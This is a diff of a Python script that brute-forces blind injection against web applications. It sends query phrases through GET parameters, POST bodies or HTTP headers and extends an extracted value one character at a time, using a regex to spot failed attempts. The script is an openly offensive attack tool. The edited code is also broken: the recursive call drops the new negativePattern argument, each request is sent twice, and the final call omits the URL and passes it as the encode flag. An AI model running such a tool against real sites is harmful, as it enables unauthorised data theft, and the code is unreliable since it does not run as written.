@@ -2,7 +2,7 @@ import argparse
 import json
 import re
 import requests
-from urllib.parse import quote as urlencode
+from urllib.parse import quote_plus as urlencode
 
 NOTIN_PLACEHOLDER = 'NOTIN'
 BRUTE_CHAR_PLACEHOLDER = '{}'
@@ -20,7 +20,7 @@ def createBruteQuery(word, query):
     return brutequery
 
 
-def createWord(char, word):
+def createWord(word, char):
     something = word + char
     return something
 
@@ -32,7 +32,7 @@ def substitutePlaceholders(query):
     return query
 
 
-def inHTTPHeader(payload, url):
+def inHTTPheader(payload, url):
     r = requests.get(url, headers=payload)
 
     return r.text
@@ -41,12 +41,10 @@ def inHTTPHeader(payload, url):
 def inPOSTrequest(payload, url):
     r = requests.post(url, data=payload)
 
-    print(r.request.body)
-
     return r.text
 
 
-def inGetRequest(payload, url):
+def inGETrequest(payload, url):
     r = requests.get(url, params=payload)
 
     return r.text
@@ -74,7 +72,7 @@ def preparePayload(parameters, phrase, encode):
     return payload
 
 
-def bruteforce(parameters, word, phrase, url, callback, encode):
+def bruteforce(parameters, word, phrase, url, callback, negativePattern, encode):
     global finish
     index = 0
 
@@ -84,14 +82,14 @@ def bruteforce(parameters, word, phrase, url, callback, encode):
 
     for char in chars:
 
-        wordCreated = createWord(char, word)
+        wordCreated = createWord(word, char)
         query = substitutePlaceholders(phrase)
         brutequery = createBruteQuery(wordCreated, query)
 
         payload = preparePayload(parameters, brutequery, encode)
 
         r = callback(payload, url)
-        result = negativePattern.search(r)
+        result = negativePattern.search(callback(payload, url))
 
         if not result:
             bruteforce(parameters, wordCreated, phrase, url, callback, encode)
@@ -107,7 +105,7 @@ def bruteforce(parameters, word, phrase, url, callback, encode):
         index += 1
 
 
-def runTests(method, parameters, phrasesToTest, url, encode=True):
+def runInjection(method, parameters, phrasesToTest, url, negativePattern, encode=True):
     global finish
 
     for phrase in phrasesToTest:
@@ -118,17 +116,17 @@ def runTests(method, parameters, phrasesToTest, url, encode=True):
         queryResult = ''
 
         if method == 'POST':
-            queryResult = bruteforce(parameters, '', phrase, url, inPOSTrequest, encode)
+            queryResult = bruteforce(parameters, '', phrase, url, inPOSTrequest, negativePattern, encode)
 
         elif method == 'GET':
-            queryResult = bruteforce(parameters, '', phrase, url, inGetRequest, encode)
+            queryResult = bruteforce(parameters, '', phrase, url, inGETrequest, negativePattern, encode)
 
         elif method == 'HEADER':
-            queryResult = bruteforce(parameters, '', phrase, url, inHTTPHeader, encode)
+            queryResult = bruteforce(parameters, '', phrase, url, inHTTPheader, negativePattern, encode)
 
         if not negativePattern.search(queryResult):
             print(' ------------------ !!!! -------------------\n\n\n')
-            print('Pattern doesn\'t occur for phrase: \n{}\n\n\n'.format(phrase))
+            print('Pattern not found for phrase: \n{}\n\n\n'.format(phrase))
             print(' ------------------ !!!! -------------------')
 
 
@@ -141,15 +139,13 @@ if __name__ == "__main__":
     parser.add_argument('-p', metavar='name', required=True, action='append',
                         help='Name of parameter (for get - param name, post - param name, for header - name of header). If params need to have fixed value use -p submit=true')
     parser.add_argument('-r', metavar='regexp', required=True,
-                        help='Regular expression for negative pattern (script search for the pattern and if present - will consider that injection failed and igrone result.)')
+                        help='Regular expression for negative pattern (Pattern for failed injection attempt - script will print info if pattern is NOT present)')
     parser.add_argument('-u', metavar='url', required=True, help='Url to test')
     parser.add_argument('-s', '--set', metavar='set_of_queries', default='blind',
                         help='Which set of queries to analyze from json file, for ex. login, blind. Default to blind.')
 
     args = parser.parse_args()
 
-    negativePattern = re.compile(args.r)
-
     jsonParsed = json.load(args.f)
 
-    runTests(args.method, args.p, jsonParsed[args.set], args.u)
+    runInjection(args.method, args.p, jsonParsed[args.set], negativePattern = re.compile(args.r), encode=args.u)
